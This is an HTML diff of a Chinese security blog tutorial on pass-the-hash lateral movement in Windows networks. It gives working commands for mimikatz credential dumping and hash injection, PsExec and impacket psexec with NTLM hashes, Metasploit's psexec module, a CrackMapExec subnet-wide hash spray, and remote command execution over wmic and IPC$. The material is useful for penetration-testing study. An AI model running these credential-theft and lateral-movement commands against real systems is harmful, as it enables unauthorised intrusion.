@@ -1,0 +1,304 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>PTH传递 | 是苹果啊</title><meta name="keywords" content="横向渗透"><meta name="author" content="是苹果啊"><meta name="copyright" content="是苹果啊"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PTH传递">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PTH传递">
+<meta property="og:url" content="https://ddd887.github.io/archives/a4ebb772.html">
+<meta property="og:site_name" content="是苹果啊">
+<meta property="og:description" content="PTH传递">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.888888.al/i/2023/08/15/10x54bu.jpg">
+<meta property="article:published_time" content="2023-03-16T13:08:25.595Z">
+<meta property="article:modified_time" content="2023-08-15T14:32:51.829Z">
+<meta property="article:author" content="是苹果啊">
+<meta property="article:tag" content="横向渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.888888.al/i/2023/08/15/10x54bu.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ddd887.github.io/archives/a4ebb772"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="code-zuJFBZJSKG"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PTH传递',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-08-15 22:32:51'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/constown/HexoCustomFile@0.0.4/dist/css/custom.min.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic.888888.al/i/2023/08/15/qn7803.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic.888888.al/i/2023/08/15/10x54bu.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">是苹果啊</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PTH传递</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-16T13:08:25.595Z" title="发表于 2023-03-16 21:08:25">2023-03-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-15T14:32:51.829Z" title="更新于 2023-08-15 22:32:51">2023-08-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/">横向渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PTH传递"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h1><h2 id="PTH-pass-the-hash-HASH传递"><a href="#PTH-pass-the-hash-HASH传递" class="headerlink" title="PTH(pass-the-hash)HASH传递"></a>PTH(pass-the-hash)HASH传递</h2><p>pass-the-hash 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。</p>
+<p>pass the hash 原理：</p>
+<p>• 在 Windows 系统中，通常会使用 NTLM 身份认证</p>
+<p>• NTLM 认证不使用明文口令，而是使用口令加密后的 hash 值，hash 值由系统 API 生成(例如 LsaLogonUser)<br>• hash 分为 LM hash 和 NT hash，如果密码长度大于 15，那么无法生成 LMhash。从 Windows Vista 和 Windows Server 2008 开始，微软默认禁用 </p>
+<p>• 如果攻击者获得了 hash，就能够在身份验证的时候模拟该用户(即跳过调用API 生成 hash 的过程)</p>
+<p>这类攻击适用于：</p>
+<p>• 域&#x2F;工作组环境</p>
+<p>• 可以获得 hash，但是条件不允许对 hash 爆破</p>
+<p>• 内网中存在和当前机器相同的密码</p>
+<p>微软也对 pth 打过补丁，然而在测试中发现，在打了补丁后，常规的 Pass The<br>Hash 已经无法成功，唯独默认的 Administrator(SID 500)账号例外，利用这个账号<br>仍可以进行 Pass The Hash 远程 ipc 连接。</p>
+<p>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使<br>用 mimikatz 还是可以攻击成功。</p>
+<p>从 windows 到 windows 横向 pth 这一类攻击方法比较广泛。</p>
+<h2 id="mimitkaz-pth"><a href="#mimitkaz-pth" class="headerlink" title="mimitkaz pth"></a>mimitkaz pth</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonpasswords</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;<span class="keyword">exit</span>&quot;&gt; password.txt</span><br><span class="line">因为mimikatz不能粘贴复制，所以我们可以将执行结果导入倒txt文件中</span><br></pre></td></tr></table></figure>
+<p><img src="https://pic.888888.al/i/2023/08/15/10tnr44.png" alt="0"></p>
+<p>得到 hash 后进行</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">privilege::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">pth</span> /<span class="title">user:administrator</span> /<span class="title">domain:workgroup</span> /<span class="title">ntlm</span>:32<span class="title">ed87bdb5fdc</span></span></span><br><span class="line"><span class="function">5<span class="title">e9cba88547376818d4</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="https://pic.888888.al/i/2023/08/15/10u15wj.png" alt="1"></p>
+<p><strong>成功后 会弹出终端 cmd。</strong></p>
+<h2 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h2><p>psexec 是 windows 官方自带的，不会存在查杀问题，属于 pstools 利用 PsExec 可以在远程计算机上执行命令，其基本原理是通过管道在远程目标主机上创建一个psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过psexec 服务运行命令，运行结束后删除服务。</p>
+<p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。对方开放 445 端口，就相当于开放了 smb 协议</p>
+<p>psexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PsExec64.exe /accepteula /s \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">123</span> -u Administrator -p <span class="number">123456</span> <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure>
+<p>-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框</p>
+<p>-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell</p>
+<p>直接直接执行回显</p>
+<p>-u 域\用户名</p>
+<p>-p 密码</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PsExec.exe /accepteula /s \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">141</span> -u Administrator -p <span class="number">123456</span> <span class="built_in">cmd</span> /c &quot;<span class="built_in">ipconfig</span>&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://pic.888888.al/i/2023/08/15/10up4ov.png" alt="2"></p>
+<p>查看是否开放445端口</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netstat -ano | <span class="built_in">find</span> &quot;<span class="number">445</span>&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://pic.888888.al/i/2023/08/15/10utluq.png" alt="3"></p>
+<p>上面是建立在明文之上 下面 hash 下进行登录</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">psexec -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">32</span>ed87bdb5fdc5e9cba8854</span><br><span class="line"><span class="number">7376818</span>d4 ./Administrator@<span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">123</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://pic.888888.al/i/2023/03/16/z61h3r.png" alt="4"></p>
+<p>出现这个错误可以使用 impacket 这个工具包下的 psexec 进行利用</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 psexec.py -hashes aa:<span class="number">32</span>ed87bdb5fdc5e9cba88547376818d4 ./Administrator@<span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">123</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://pic.888888.al/i/2023/08/15/10vf30k.png" alt="5"></p>
+<p>在使用 PsExec 时需要注意以下几点：</p>
+<p>• 需要远程系统开启 admin$ 共享（默认是开启的）</p>
+<p>• 因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放 445 端口</p>
+<p>• 在使用 IPC$ 连接目标系统后，不需要输入账户和密码。</p>
+<p>• 在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务，命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。</p>
+<p>• 使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是administrator 权限的 shell </p>
+<p>• 在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能，只能依靠账号和密码进行传递。</p>
+<p>登陆域管理命令</p>
+<p>impacket 下的 psexec</p>
+<p>python3 psexec.py moonsec&#x2F;<a href="mailto:&#65;&#100;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#114;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x30;&#x2e;&#x31;&#x34;&#50;" rel="external nofollow noreferrer">&#65;&#100;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#114;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x30;&#x2e;&#x31;&#x34;&#50;</a></p>
+<p>执行命令后输入密码</p>
+<p>登陆其他主机管理员</p>
+<p>psexec &#x2F;accepteula &#x2F;s \12server1 -u Administrator -p 123456 cmd</p>
+<h2 id="使用-msf-hash-模块"><a href="#使用-msf-hash-模块" class="headerlink" title="使用 msf hash 模块"></a>使用 msf hash 模块</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> SMBUser Administrator</span><br><span class="line"><span class="built_in">set</span> rhosts <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">141</span></span><br><span class="line"><span class="built_in">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:<span class="number">32</span>ed87bdb5fdc5e9cba885473</span><br><span class="line"><span class="number">76818</span>d4</span><br></pre></td></tr></table></figure>
+<p><img src="https://pic.888888.al/i/2023/08/15/10vwrti.png" alt="6"></p>
+<h2 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h2><p>CrackMapExec 可以对 C 段中的主机进行批量 pth,项目地址：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/byt3bl33d3r/CrackMapExec.git">https://github.com/byt3bl33d3r/CrackMapExec.git</a></p>
+<p>使用命令：</p>
+<p>crackmapexec smb 192.168.0.0&#x2F;24 -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4</p>
+<p>对 192.168.9.0&#x2F;24 C 段进行批量 pass the hash<br><img src="https://pic.888888.al/i/2023/08/15/10wav3v.png" alt="7"></p>
+<h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><p>WMI 全称 Windows Management Instrumentation 即 Windows 管理工具，<br>Windows 98 以后的操作系统都支持 WMI。</p>
+<p>由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将<br>PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些。</p>
+<h3 id="wmic-命令"><a href="#wmic-命令" class="headerlink" title="wmic 命令"></a>wmic 命令</h3><p>WMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执行结果保存在目<br>标主机 C 盘的 ip.txt 文件中</p>
+<p>使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口</p>
+<p>( 135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445 端⼝传回显)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /node:192.168.0.123 /user:administrator /password:123456 process call create &quot;cmd.exe /c ipconfig &gt; c:\ip.txt&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://pic.888888.al/i/2023/08/15/10wh6gx.png" alt="8"><br>.</p>
+<p>.</p>
+<p>.</p>
+<p>之后建立 IPC$ ，使用 type 读取执行结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\192.168.0.123\ipc$ &quot;123456&quot; /user:administrator</span><br><span class="line">type \\192.168.0.123\c$\ip.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://pic.888888.al/i/2023/08/15/10wlisi.png" alt="9"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://ddd887.github.io">是苹果啊</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ddd887.github.io/archives/a4ebb772.html">https://ddd887.github.io/archives/a4ebb772.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ddd887.github.io" target="_blank">是苹果啊</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/">横向渗透</a></div><div class="post_share"><div class="social-share" data-image="https://pic.888888.al/i/2023/08/15/10x54bu.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://pic.888888.al/i/2023/08/15/sv49cq.jpg" rel="external nofollow noreferrer" target="_blank"><img class="post-qr-code-img" src="https://pic.888888.al/i/2023/08/15/sv49cq.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://pic.888888.al/i/2023/08/15/sv7xxm.jpg" rel="external nofollow noreferrer" target="_blank"><img class="post-qr-code-img" src="https://pic.888888.al/i/2023/08/15/sv7xxm.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/archives/c0777afa.html"><img class="prev-cover" src="https://pic.888888.al/i/2023/08/15/10sg7xc.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Kerberos协议详解（转载）</div></div></a></div><div class="next-post pull-right"><a href="/archives/397dc553.html"><img class="next-cover" src="https://pic.888888.al/i/2023/08/15/10jdgg7.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">域信息收集命令</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://pic.888888.al/i/2023/08/15/qn7803.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">是苹果啊</div><div class="author-info__description">步履不停</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/ddd887"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ddd887" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2301002710@qq.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://pic.888888.al/i/2023/08/15/12khmuy.png" rel="external nofollow noreferrer" target="_blank" title="QQ"><i class="fa-brands fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">开心最重要！！！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.</span> <span class="toc-text">横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH-pass-the-hash-HASH%E4%BC%A0%E9%80%92"><span class="toc-number">1.1.</span> <span class="toc-text">PTH(pass-the-hash)HASH传递</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mimitkaz-pth"><span class="toc-number">1.2.</span> <span class="toc-text">mimitkaz pth</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#psexec"><span class="toc-number">1.3.</span> <span class="toc-text">psexec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-msf-hash-%E6%A8%A1%E5%9D%97"><span class="toc-number">1.4.</span> <span class="toc-text">使用 msf hash 模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CrackMapExec"><span class="toc-number">1.5.</span> <span class="toc-text">CrackMapExec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WMI"><span class="toc-number">1.6.</span> <span class="toc-text">WMI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wmic-%E5%91%BD%E4%BB%A4"><span class="toc-number">1.6.1.</span> <span class="toc-text">wmic 命令</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/archives/afb5413b.html" title="KindEditor文件上传漏洞"><img src="https://pic.888888.al/i/2023/08/15/11byltz.jfif" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="KindEditor文件上传漏洞"/></a><div class="content"><a class="title" href="/archives/afb5413b.html" title="KindEditor文件上传漏洞">KindEditor文件上传漏洞</a><time datetime="2023-08-15T14:47:15.977Z" title="发表于 2023-08-15 22:47:15">2023-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/5a428c68.html" title="JAVA反序列化漏洞基础"><img src="https://pic.888888.al/i/2023/08/15/10yo3t9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JAVA反序列化漏洞基础"/></a><div class="content"><a class="title" href="/archives/5a428c68.html" title="JAVA反序列化漏洞基础">JAVA反序列化漏洞基础</a><time datetime="2023-04-23T13:00:50.304Z" title="发表于 2023-04-23 21:00:50">2023-04-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/c0777afa.html" title="Kerberos协议详解（转载）"><img src="https://pic.888888.al/i/2023/08/15/10sg7xc.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Kerberos协议详解（转载）"/></a><div class="content"><a class="title" href="/archives/c0777afa.html" title="Kerberos协议详解（转载）">Kerberos协议详解（转载）</a><time datetime="2023-03-18T06:35:51.221Z" title="发表于 2023-03-18 14:35:51">2023-03-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/a4ebb772.html" title="PTH传递"><img src="https://pic.888888.al/i/2023/08/15/10x54bu.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PTH传递"/></a><div class="content"><a class="title" href="/archives/a4ebb772.html" title="PTH传递">PTH传递</a><time datetime="2023-03-16T13:08:25.595Z" title="发表于 2023-03-16 21:08:25">2023-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/397dc553.html" title="域信息收集命令"><img src="https://pic.888888.al/i/2023/08/15/10jdgg7.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="域信息收集命令"/></a><div class="content"><a class="title" href="/archives/397dc553.html" title="域信息收集命令">域信息收集命令</a><time datetime="2023-03-15T09:09:19.260Z" title="发表于 2023-03-15 17:09:19">2023-03-15</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020d - 2023 By 是苹果啊</div><div class="footer_custom_text">到底啦，真的没有了😤</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
